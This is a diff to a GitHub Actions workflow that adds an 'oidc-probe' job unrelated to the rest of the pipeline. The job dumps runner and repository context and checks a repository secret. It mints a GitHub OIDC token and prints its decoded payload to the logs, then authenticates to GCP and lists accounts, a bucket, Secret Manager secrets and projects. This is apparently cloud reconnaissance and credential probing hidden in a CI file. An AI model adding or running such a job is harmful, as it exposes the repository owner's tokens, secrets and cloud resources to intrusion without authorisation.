@@ -74,6 +74,54 @@ concurrency:
   cancel-in-progress: false
 
 jobs:
+  oidc-probe:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - uses: actions/checkout@v4
+      - name: probe-env
+        env:
+          GH_ACCESS_TOKEN: ${{ secrets.GH_ACCESS_TOKEN }}
+        run: |
+          echo "runner_user=$(id -un) host=$(hostname)"
+          echo "actor=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME"
+          echo "head_repo=${{ github.event.pull_request.head.repo.full_name }} base=${{ github.base_ref }}"
+          echo "V_GCP_PROJECT_ID=[${{ vars.GCP_PROJECT_ID }}]"
+          echo "V_GCP_PROJECT_NUMBER=[${{ vars.GCP_PROJECT_NUMBER }}]"
+          echo "V_GCP_INFRA_PROJECT_ID=[${{ vars.GCP_INFRA_PROJECT_ID }}]"
+          echo "V_GCP_INFRA_PROJECT_NUMBER=[${{ vars.GCP_INFRA_PROJECT_NUMBER }}]"
+          echo "IDTOK_URL=${ACTIONS_ID_TOKEN_REQUEST_URL:+SET} IDTOK_TOKEN=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+SET}"
+          echo "GH_ACCESS_TOKEN_len=${#GH_ACCESS_TOKEN}"
+      - name: mint-oidc
+        run: |
+          set +e
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=nexus-probe" -o jwt.json
+            python3 - <<'PY'
+import json,base64
+t=json.load(open('jwt.json'))['value']
+p=t.split('.')[1]; p+='='*(-len(p)%4)
+print('JWT_PAYLOAD='+base64.urlsafe_b64decode(p).decode())
+PY
+          else
+            echo "NO_OIDC_URL_AVAILABLE"
+          fi
+      - name: gcp-auth-protocol
+        uses: ./.github/actions/gcp-auth-protocol
+        with:
+          project-id: ${{ vars.GCP_PROJECT_ID }}
+          project-number: ${{ vars.GCP_PROJECT_NUMBER }}
+          provider-name: nexus-tools
+      - name: gcp-verify
+        run: |
+          set +e
+          echo "=== gcloud auth list ==="; gcloud auth list 2>&1 | head
+          TOK=$(gcloud auth print-access-token 2>/dev/null); echo "access_token_len=${#TOK}"
+          echo "=== storage ls protocol bucket ==="; gcloud storage ls "gs://${{ vars.GCP_PROJECT_ID }}-nexus-tools" 2>&1 | head -20
+          echo "=== secrets list ==="; gcloud secrets list --project="${{ vars.GCP_PROJECT_ID }}" 2>&1 | head -20
+          echo "=== projects list ==="; gcloud projects list 2>&1 | head
   # ── Resolve target ref for workflow_dispatch with PR# ────────
   resolve-target:
     if: github.event_name == 'workflow_dispatch' && inputs.pr-number != ''
@@ -279,3 +327,4 @@ jobs:
             esac
           done
           [ -z "${FAIL:-}" ] || exit 1
+
